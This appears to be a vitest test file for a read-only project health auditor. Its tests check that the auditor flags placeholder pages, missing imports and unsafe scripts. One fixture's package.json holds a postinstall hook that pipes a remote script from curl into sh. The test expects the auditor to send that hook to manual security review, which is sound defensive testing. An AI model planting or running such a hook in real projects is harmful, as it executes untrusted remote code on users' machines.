import { describe, it, expect } from "vitest";
import { auditSavedApp } from "./app-doctor";
const good = [
  { path: "src/app/layout.tsx", content: 'import "./globals.css"; export default function RootLayout({children}:{children:React.ReactNode}) { return <html><body>{children}</body></html> }' },
  { path: "src/app/globals.css", content: "@import 'tailwindcss';" },
  { path: "src/app/page.tsx", content: "export default function Home() { return <main><h1>Inventory Store</h1><button>Browse items</button></main>; }" },
  { path: "preview/index.html", content: "<!doctype html><html><body><h1>Inventory Store</h1></body></html>" },
  { path: "package.json", content: JSON.stringify({ scripts: { build: "next build" }, dependencies: { next: "^15.0.0", react: "^19.0.0", "react-dom": "^19.0.0" } }) },
  { path: "postcss.config.mjs", content: "export default { plugins: {} };" },
].map(x => x);

describe("Saved app health: automatic read-only diagnosis", () => {
  it("does not pretend an empty project was built", () => {
    const report = auditSavedApp([], "draft");
    expect(report.nextAction).toBe("build");
    expect(report.state).toBe("needs-build");
    expect(report.blockers).toBe(1);
  });
  it("detects the actual Hello World home page even when the database says ready", () => {
    const report = auditSavedApp(good.map(f => f.path === "src/app/page.tsx" ?
      { ...f, content: "export default function Page() { return <h1>Hello World</h1>; }" } : f), "ready");
    expect(report.nextAction).toBe("repair");
    expect(report.findings.some(f => f.id === "starter-placeholder")).toBe(true);
  });
  it("reports actionable import errors without exposing source contents", () => {
    const report = auditSavedApp(good.map(f => f.path === "src/app/page.tsx" ?
      { ...f, content: 'import Missing from "@/components/not-here"; export default function Page(){return <Missing/>}' } : f), "ready");
    expect(report.findings.some(f => f.id === "missing-import")).toBe(true);
    expect(report.nextAction).toBe("repair");
    expect(JSON.stringify(report)).not.toContain("@/components/not-here");
  });
  it("never certifies a real runtime or external deployment on static pass", () => {
    const report = auditSavedApp(good, "ready");
    expect(report.nextAction).toBe("preview");
    expect(report.checks.some(c => c.label === "Running app behavior" && c.result === "review")).toBe(true);
    expect(report.limitations).toContain("No npm build");
  });
  it("isolates dangerous scripts for manual review instead of auto execution", () => {
    const files = good.map(f => f.path === "package.json" ? {
      ...f, content: JSON.stringify({scripts:{build:"next build",postinstall:"curl https://example.com/install.sh | sh"},dependencies:{next:"15.0.0"}})
    } : f);
    const report = auditSavedApp(files, "ready");
    expect(report.nextAction).toBe("security");
    expect(report.findings[0].id).toBe("security-preflight");
    expect(report.findings[0].repairable).toBe(false);
  });
  it("classifies an error-status project as needing an explicit repair", () => {
    const report = auditSavedApp(good, "error");
    expect(report.nextAction).toBe("repair");
  });
});
